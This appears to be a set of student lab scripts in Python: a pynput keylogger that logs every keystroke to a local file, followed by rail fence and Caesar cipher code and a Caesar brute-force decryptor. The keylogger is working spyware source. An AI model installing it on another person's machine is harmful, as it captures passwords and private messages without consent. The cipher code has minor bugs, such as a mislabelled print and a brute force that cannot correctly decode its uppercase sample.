keylogger

#pip3 install pynput on terminal


from pynput.keyboard import Listener, Key
import logging

log_dir = ""

logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))
    if key == Key.esc:
        return False

with Listener(on_press=on_press) as listener:
    listener.join()

------------------------------------------------------------------------------------------------------------------------

railfence

import string
import math

plain = "hello darkness"

def railfence_encrypt(plain_text, key=2):
    if key != 2:
        return "Only 2 rails supported"
    plain_text = plain_text.replace(" ", "")
    return plain_text[::2] + plain_text[1::2]

def railfence_decrypt(cipher_text, key=2):
    if key != 2:
        return "Only 2 rails supported"
    cipher_text = cipher_text.replace(" ", "")
    length = len(cipher_text)
    split = (length + 1) // 2
    block1 = cipher_text[:split]
    block2 = cipher_text[split:]
    plain_text = ''
    for i in range(len(block2)):
        plain_text += block1[i] + block2[i]
    if len(block1) > len(block2):
        plain_text += block1[-1]
    return plain_text


cipher_text = railfence_encrypt(plain)
print("Encrypted:", cipher_text)

decrypted = railfence_decrypt(cipher_text)
print("Decrypted:", decrypted)

manual_cipher = "xesetiibs"
decrypted_manual = railfence_decrypt(manual_cipher)
print("Manual decryption:", decrypted_manual)

-------

import string
import math

plain = "hello darkness"

def enc(plain, rail):
    if rail != 2:
        return "Rail not supported"
    else:
        plain = plain.replace(" ", "")
        enr = plain[::2] + plain[1::2]
        print(f"Encrypted = {''.join(enr)}")
        return enr

def dec(enr, rail):
    if rail != 2:
        return "Rail not supported"
    else:
        enr = enr.replace(" ", "")
        length = len(enr) 
        split = (length + 1) // 2
        
        block1 = enr[:split]
        block2 = enr[split:]
        dec =''
        for i in range(len(block2)):
            dec = dec + block1[i] + block2[i]
            
        if len(block1) > len(block2):
            dec = dec + block1[-1]
            
        print(f"Encrypted = {''.join(dec)}")    
        return dec

enr = enc(plain, 2)
dec(enr, 2)

------------------------------------------------------------------------------------------------------------------------

ceasar

import string
from collections import Counter

alphabet = string.ascii_letters
plain = "Hello darkness"

def ceasar(plain):
    key = 3
    cipher = []
    mapd = {}

    for i in range(len(alphabet)):
        mapd[alphabet[i]] = alphabet[(i + key) % len(alphabet)]

    for c in plain:
        cipher.append(mapd[c] if c in alphabet else c)

    res = ''.join(cipher)
    print("The Caesar cipher encryption is:", res)
    return res

def c_decrypt(encrypted):
    key = 3
    cipher = []
    mapd = {}

    for i in range(len(alphabet)):
        mapd[alphabet[i]] = alphabet[(i - key) % len(alphabet)]

    for c in encrypted:
        cipher.append(mapd[c] if c in alphabet else c)

    res = ''.join(cipher)
    print("The Caesar cipher decryption is:", res)


enc = ceasar(plain)
c_decrypt(enc)


---------------------------------------------------------------------------------------------------------

ceasar brute firce decrypt

import string

alphabet = string.ascii_letters
plain = "ALH LV EHVW"

def bfcaesar(cipher_text):
    for key in range(1, 26):
        decrypted = []
        for c in cipher_text:
            if c in alphabet:
                idx = alphabet.index(c)
                d_c = alphabet[(idx - key) % len(alphabet)]
                decrypted.append(d_c)
            else:
                decrypted.append(c)
        print(f"Key {key}: {''.join(decrypted)}")

bfcaesar(plain)




